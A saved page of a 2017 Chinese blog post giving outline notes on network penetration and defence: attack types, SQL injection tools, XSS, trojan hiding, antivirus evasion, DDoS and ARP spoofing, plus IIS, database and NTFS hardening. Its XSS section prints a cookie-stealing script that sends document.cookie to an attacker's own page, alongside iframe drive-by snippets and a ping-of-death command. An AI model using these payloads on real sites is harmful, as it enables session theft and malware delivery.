@@ -1,0 +1,563 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>网络渗透与深度防御笔记 | dmonster&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="翻墙：1. 免费代理服务器（工具——internet选项——连接——局域网设置） 2. 肉机 3. 2次vpn（91vpn） 入侵还原：- 利用漏洞 攻击方法： 溢出攻击：栈，堆。  远程溢出：溢出工具+对方服务器ip+cmdshell   （ms12-020：3389） 本地溢出：  程序——提权（ser-u ，360） 自动更新：已公布的 后门     汇编语言：  漏洞挖掘 破解分析   防">
+<meta name="keywords" content="网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络渗透与深度防御笔记">
+<meta property="og:url" content="http://dmonster.top/2017/04/06/网络渗透与深度防御笔记/index.html">
+<meta property="og:site_name" content="dmonster&#39;s blog">
+<meta property="og:description" content="翻墙：1. 免费代理服务器（工具——internet选项——连接——局域网设置） 2. 肉机 3. 2次vpn（91vpn） 入侵还原：- 利用漏洞 攻击方法： 溢出攻击：栈，堆。  远程溢出：溢出工具+对方服务器ip+cmdshell   （ms12-020：3389） 本地溢出：  程序——提权（ser-u ，360） 自动更新：已公布的 后门     汇编语言：  漏洞挖掘 破解分析   防">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-03-15T02:02:16.099Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网络渗透与深度防御笔记">
+<meta name="twitter:description" content="翻墙：1. 免费代理服务器（工具——internet选项——连接——局域网设置） 2. 肉机 3. 2次vpn（91vpn） 入侵还原：- 利用漏洞 攻击方法： 溢出攻击：栈，堆。  远程溢出：溢出工具+对方服务器ip+cmdshell   （ms12-020：3389） 本地溢出：  程序——提权（ser-u ，360） 自动更新：已公布的 后门     汇编语言：  漏洞挖掘 破解分析   防">
+  
+    <link rel="alternative" href="/atom.xml" title="dmonster&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+</head>
+<body>
+<div id="container">
+  <div id="wrap">
+    <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">dmonster&#39;s blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Hello my world!</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/sitemap.xml">sitemap</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
+          <input type="submit" value="" class="search-form-submit">
+          <input name=tn type=hidden value="bds">
+          <input name=cl type=hidden value="3">
+          <input name=ct type=hidden value="2097152">
+          <input type="hidden" name="si" value="dmonster.top">
+        </form>
+      </div>
+    </div>
+  </div>
+</header>
+    <div class="outer">
+      <section id="main"><article id="post-网络渗透与深度防御笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/04/06/网络渗透与深度防御笔记/" class="article-date">
+  <time datetime="2017-04-06T07:15:45.000Z" itemprop="datePublished">2017-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/笔记/">笔记</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      网络渗透与深度防御笔记
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      <!-- Table of Contents -->
+      
+        <div id="toc" class="toc-article">
+          <strong class="toc-title">文章目录</strong>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#翻墙："><span class="toc-number">1.</span> <span class="toc-text">翻墙：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#入侵还原："><span class="toc-number">2.</span> <span class="toc-text">入侵还原：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击方法："><span class="toc-number">3.</span> <span class="toc-text">攻击方法：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入："><span class="toc-number">4.</span> <span class="toc-text">sql注入：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xss跨站："><span class="toc-number">5.</span> <span class="toc-text">xss跨站：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dos-ddos："><span class="toc-number">6.</span> <span class="toc-text">dos/ddos：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#杀毒软件："><span class="toc-number">7.</span> <span class="toc-text">杀毒软件：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#免杀："><span class="toc-number">8.</span> <span class="toc-text">免杀：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#四无："><span class="toc-number">9.</span> <span class="toc-text">四无：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB终极加固："><span class="toc-number">10.</span> <span class="toc-text">WEB终极加固：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dos-ddos-拒绝服务-分布式拒绝服务"><span class="toc-number">11.</span> <span class="toc-text">dos/ddos  拒绝服务/分布式拒绝服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Xss跨站（客户端）"><span class="toc-number">12.</span> <span class="toc-text">Xss跨站（客户端）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#木马的隐藏"><span class="toc-number">13.</span> <span class="toc-text">木马的隐藏</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#手工杀马："><span class="toc-number">14.</span> <span class="toc-text">手工杀马：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#手工杀病毒："><span class="toc-number">15.</span> <span class="toc-text">手工杀病毒：</span></a></li></ol>
+        </div>
+      
+        <h1 id="翻墙："><a href="#翻墙：" class="headerlink" title="翻墙："></a>翻墙：</h1><pre><code>1. 免费代理服务器（工具——internet选项——连接——局域网设置）
+2. 肉机
+3. 2次vpn（91vpn）
+</code></pre><h1 id="入侵还原："><a href="#入侵还原：" class="headerlink" title="入侵还原："></a>入侵还原：</h1><pre><code>- 利用漏洞
+</code></pre><h1 id="攻击方法："><a href="#攻击方法：" class="headerlink" title="攻击方法："></a>攻击方法：</h1><ul>
+<li><p>溢出攻击：栈，堆。</p>
+<ol>
+<li>远程溢出：溢出工具+对方服务器ip+cmdshell   （ms12-020：3389）</li>
+<li>本地溢出：  程序——提权（ser-u ，360）<ul>
+<li>自动更新：已公布的 后门</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>汇编语言：</p>
+<ul>
+<li>漏洞挖掘 破解分析</li>
+</ul>
+</li>
+<li><p>防御：</p>
+<ul>
+<li>安全编码，输入参数过滤</li>
+</ul>
+</li>
+<li><p>邮件攻击：  </p>
+<ol>
+<li>密码破解：字典</li>
+<li>垃圾邮件——炸蛋——系统stop</li>
+<li>邮件钓鱼：链接（美女 特价 附马邮件（以纯文本方式安全打开））</li>
+<li>伪装发件人：1和l，0和O，4和A</li>
+<li>表单钓鱼：提交信息——网页生成文件或发送信息至黑客邮箱</li>
+<li>邮箱跨站：hotmail， gmail，yahoo，139，sina</li>
+</ol>
+</li>
+<li><p>手机攻击：   </p>
+<ol>
+<li>IOS诊断有后门 </li>
+<li>手机远程控制：微信，陌陌，通话环境录音，通讯录，照片</li>
+<li>伪基站</li>
+<li>sim卡复制</li>
+<li>“呼死你”k8——1000呼|短信</li>
+</ol>
+</li>
+<li><p>网银攻击：</p>
+<ul>
+<li>浮云木马，在线劫持，网银大盗，银行卡复制，u盾：高级克隆（硬对硬复制） </li>
+</ul>
+</li>
+<li><p>逻辑漏洞：</p>
+<ul>
+<li>表示逻辑  </li>
+<li>业务逻辑  </li>
+<li>访问逻辑</li>
+<li>例：id=xxxxxxx&amp;pass=xxxxxxxxxx</li>
+</ul>
+</li>
+<li><p>平行权限：</p>
+<ul>
+<li>网购：</li>
+<li>A：订单1101，</li>
+<li>B：订单=1101——删除</li>
+</ul>
+</li>
+<li><p>目录遍历：</p>
+<ul>
+<li>原因：浏览目录权限  </li>
+<li>baidu：  inurl；qq.txt<br>  index of /ppt    +pass/…………..<br>  index of /xls<br>  index of /data</li>
+</ul>
+</li>
+<li><p>密码获取： </p>
+<ol>
+<li>暴力破解：LC，SAMINSIDE</li>
+<li>肩窥</li>
+<li>中间人攻击</li>
+<li>siniffer 嗅探</li>
+<li>社会工程学</li>
+<li>星号密码克星     灵格斯翻译（划词功能）</li>
+<li>自动登录，记住密码 cookies欺骗 绕过验证</li>
+<li>数据库dv_log记录     </li>
+</ol>
+</li>
+<li><p>网络钓鱼：</p>
+<ul>
+<li><a href="http://www.taobao.com（url转码）（越长越要小心）" target="_blank" rel="noopener">www.taobao.com（url转码）（越长越要小心）</a></li>
+</ul>
+</li>
+<li><p>社会工程学：</p>
+<ul>
+<li>APT（持久性攻击）  </li>
+<li>改号软件  QQ（女孩）</li>
+<li>反向社工</li>
+</ul>
+</li>
+</ul>
+<h1 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h1><pre><code>1. access+asp
+2. mssql
+3. php+mysql
+ 4. jsp+oracle（大型）
+
+1. 注入原因：程序对用户输入的字符没有过滤。
+2. 如何判断注入点：www.xxxx.com/a.asp（脚本）？id=1....    能执行语句
+3. 自动工具：domain   pangolin（穿山甲）   sqlmap    管中窥豹（穿waf：wab app fw）
+</code></pre><h1 id="xss跨站："><a href="#xss跨站：" class="headerlink" title="xss跨站："></a>xss跨站：</h1><ul>
+<li>挂马，盗cookies，xss盲打，dos，xss蠕虫，后台添加管理员</li>
+</ul>
+<h1 id="dos-ddos："><a href="#dos-ddos：" class="headerlink" title="dos/ddos："></a>dos/ddos：</h1><ul>
+<li><p>拒绝服务/分布式拒绝服务（世界难题）</p>
+</li>
+<li><p>挂马：</p>
+<ol>
+<li><p>内嵌式框架挂马</p>
+<pre><code>&lt;iframe src=http://(ip)/&gt; /&lt;//iframe/&gt;
+</code></pre></li>
+<li>数据库挂马</li>
+<li>定向挂马</li>
+<li>漏洞挂马：ie  暴风影音 360</li>
+</ol>
+</li>
+</ul>
+<h1 id="杀毒软件："><a href="#杀毒软件：" class="headerlink" title="杀毒软件："></a>杀毒软件：</h1><ul>
+<li>已知病毒：特征码</li>
+<li>未知病毒：主动防御——行为</li>
+<li>高启发——仿真</li>
+</ul>
+<h1 id="免杀："><a href="#免杀：" class="headerlink" title="免杀："></a>免杀：</h1><ul>
+<li>数字签名</li>
+<li>区段加密.加壳</li>
+</ul>
+<h1 id="四无："><a href="#四无：" class="headerlink" title="四无："></a>四无：</h1><ul>
+<li>无启动项，</li>
+<li>无端口，</li>
+<li>无进程，</li>
+<li>无磁盘文件（hook，硬件：bios cih）</li>
+</ul>
+<h1 id="WEB终极加固："><a href="#WEB终极加固：" class="headerlink" title="WEB终极加固："></a>WEB终极加固：</h1><ul>
+<li>iis：<ol>
+<li>修改默认日志的路径</li>
+<li>网站—属性—高级– ：协议版本，cookie<pre><code>（日志分析：splunk，biglog）
+</code></pre></li>
+<li>删除所有不必要的映射：扩展名：asp，html防止黑客上传其他扩展名文件<pre><code>主目录—配置—映射
+</code></pre></li>
+<li>向客户端发送以下信息：出错：110监控网站<pre><code>主目录—配置—映射
+</code></pre></li>
+<li>iis权限：不给写入，目录浏览</li>
+<li>限制后台登陆ip：登录后台地址：admin—右键—目录安全性—属性—允许：ip段</li>
+<li>删除所有自定义错误</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li><p>数据库：</p>
+<ol>
+<li>禁止websever和数据库同台</li>
+<li>修改默认库及表的位置和名字</li>
+<li>认证：口令复杂，权限：行，列，数据库加密，日志审核</li>
+<li>防下载：数据库重定向主页</li>
+</ol>
+</li>
+<li><p>ntfs加固：终极防webshell：能写不能执行 能执行不能写</p>
+<ol>
+<li>删除所有默认权限</li>
+<li>添加administrator，完全控制</li>
+<li>添加iis—wpg：完全控制</li>
+<li>添加iusr—计算机名 （来宾）–只读</li>
+<li>确定那些需要写入权限：data，databackup，uploadfile，uploadface给来宾-写入</li>
+<li>给以上目录：拒接执行</li>
+</ol>
+</li>
+</ul>
+<h1 id="dos-ddos-拒绝服务-分布式拒绝服务"><a href="#dos-ddos-拒绝服务-分布式拒绝服务" class="headerlink" title="dos/ddos  拒绝服务/分布式拒绝服务"></a>dos/ddos  拒绝服务/分布式拒绝服务</h1><ul>
+<li><p>tcp三次握手   </p>
+<ul>
+<li>S-syn： 请求连接（1）</li>
+<li>F-fin ：结束连接（1）</li>
+<li>A-ack：确定 acknumber=对方seg+1</li>
+<li><p>R-rst：复位</p>
+<p>-发送方：syn=1, seg=100<br>-接收方：syn=1, ack=1, acknumber=101, seg=300<br>-发送方：       ack=1, acknumber=301, seg=100</p>
+</li>
+</ul>
+</li>
+<li><p>配置远程控制木马：</p>
+<ul>
+<li>灰鸽子，</li>
+<li>pcshare，</li>
+<li>魔术，</li>
+<li>波尔</li>
+</ul>
+<ol>
+<li>pcshare无限版：生成客户端：<br>  ip：域名：端口：808（没有被占用的端口）    </li>
+<li>穿墙 dll注入ie进程</li>
+<li>ping of death： ping ip -1 65500 –t</li>
+<li>阿拉丁</li>
+<li>cc攻击（snifferrpro）</li>
+</ol>
+</li>
+<li><p>会话劫持</p>
+<ul>
+<li>ip-mac：arp</li>
+<li>cmd：       <ul>
+<li>arp-a:显示本地arp缓存</li>
+<li>arp-d *：清除缓存</li>
+<li>arp-s：绑定</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>安装CAIN，安装WINCAP</li>
+<li>运行CAIN ： <ul>
+<li>start sniffer 点网卡图标—host  空白区右键  sacn mac—-arp 点加号：左边：服务器ip，右边客户端ip</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h1 id="Xss跨站（客户端）"><a href="#Xss跨站（客户端）" class="headerlink" title="Xss跨站（客户端）"></a>Xss跨站（客户端）</h1><ul>
+<li><p>所有输入点都是攻击源</p>
+<ol>
+<li><p>测试漏洞：</p>
+<pre><code>&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;
+</code></pre></li>
+<li>挂马：”&lt;iframe src=hettp//ip//a.js&gt;“</li>
+<li>盗cookis <ul>
+<li>例”<scrpt>document.location=’自己网站/cookies.asp?msg=’+document.cookie“</scrpt></li>
+<li>(在自己做的网站下放cookies。Asp文件用来获取盗取的cookies)</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h1 id="木马的隐藏"><a href="#木马的隐藏" class="headerlink" title="木马的隐藏"></a>木马的隐藏</h1><ol>
+<li>Rar文件：创建自解压格式<pre><code>解压前：muma.exe
+解压后：qq.exe
+</code></pre></li>
+<li>伪装成图片和记事本的图标</li>
+<li>利用捆绑器：正常文件+木马</li>
+<li>源分发:源代码里有木马代码</li>
+<li>hook：钩子 ssdt.lnkine.fsd.fsdinline</li>
+<li>文件资源区</li>
+<li>进程守护</li>
+<li>dll注入进程</li>
+<li>dll本地劫持</li>
+</ol>
+<h1 id="手工杀马："><a href="#手工杀马：" class="headerlink" title="手工杀马："></a>手工杀马：</h1><ul>
+<li>Installrite：快照：snap1 snap2</li>
+<li>Avafind：硬盘快速索引</li>
+<li><p>进程管理工具</p>
+</li>
+<li><p>木马位置：</p>
+<ul>
+<li>查没有数字签名的进程文件cmd删除隐藏木马文件属性 ：</li>
+<li>/a显示隐藏，attrib  –s -r- h删除属性</li>
+</ul>
+</li>
+</ul>
+<h1 id="手工杀病毒："><a href="#手工杀病毒：" class="headerlink" title="手工杀病毒："></a>手工杀病毒：</h1><ul>
+<li>svchost。Exe位置</li>
+<li>将svchost。Exe加载到od-右键-查看字符串</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="http://dmonster.top/2017/04/06/网络渗透与深度防御笔记/" data-id="cjescjkfk001e9oug9j6n94m5" class="article-share-link" data-share="baidu" data-title="网络渗透与深度防御笔记">分享到</a>
+      
+
+      
+        <a href="http://dmonster.top/2017/04/06/网络渗透与深度防御笔记/#ds-thread" class="article-comment-link">评论</a>
+      
+
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/04/13/hexo+github创建自己的博客(1)/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">
+        
+          hexo+github搭建自己的博客
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+  <section id="comments">
+    <div id="ds-thread" class="ds-thread" data-thread-key="2017/04/06/网络渗透与深度防御笔记/" data-title="网络渗透与深度防御笔记" data-url="http://dmonster.top/2017/04/06/网络渗透与深度防御笔记/"></div>
+  </section>
+</section>
+      
+      <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/实验/">实验</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/笔记/">笔记</a><span class="category-list-count">18</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCIE/">CCIE</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCNA/">CCNA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CCNP/">CCNP</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/学习笔记/">学习笔记</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网络安全/">网络安全</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">十二月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">8</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">近期文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/12/02/网络安全/">网络安全</a>
+          </li>
+        
+          <li>
+            <a href="/2017/12/02/网络安全(1)/">网络安全</a>
+          </li>
+        
+          <li>
+            <a href="/2017/11/25/ISIS/">ISIS</a>
+          </li>
+        
+          <li>
+            <a href="/2017/11/25/多播/">多播</a>
+          </li>
+        
+          <li>
+            <a href="/2017/11/24/MPLS/">MPLS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+     
+	<div class="widget-wrap"> 
+		<h3 class="widget-title">Weibo show</h3> 
+		<div class="widget-weibo"> 
+			<iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=2&ptype=1&speed=0&skin=5&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=5753916666&verifier=c645597d&dpc=1"></iframe>
+		</div> 
+	</div> 
+
+  
+</aside>
+      
+    </div>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 dmonster<br>
+      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
+      .
+      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
+    </div>
+  </div>
+</footer>
+  </div>
+  <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/sitemap.xml" class="mobile-nav-link">sitemap</a>
+  
+</nav>
+  <!-- totop start -->
+<div id="totop">
+<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+
+<!-- totop end -->
+
+<!-- 多说公共js代码 start -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"reqianduan"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+<!-- 多说公共js代码 end -->
+
+
+<!-- 百度分享 start -->
+
+<div id="article-share-box" class="article-share-box">
+  <div id="bdshare" class="bdsharebuttonbox article-share-links">
+    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
+    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
+    <a class="article-share-more" data-cmd="more" title="更多"></a>
+  </div>
+</div>
+<script>
+  function SetShareData(cmd, config) {
+    if (shareDataTitle && shareDataUrl) {
+      config.bdText = shareDataTitle;
+      config.bdUrl = shareDataUrl;
+    }
+    return config;
+  }
+  window._bd_share_config={
+    "common":{onBeforeClick: SetShareData},
+    "share":{"bdCustomStyle":"/css/bdshare.css"}
+  };
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+<!-- 百度分享 end -->
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+</div>
+</body>
+</html>
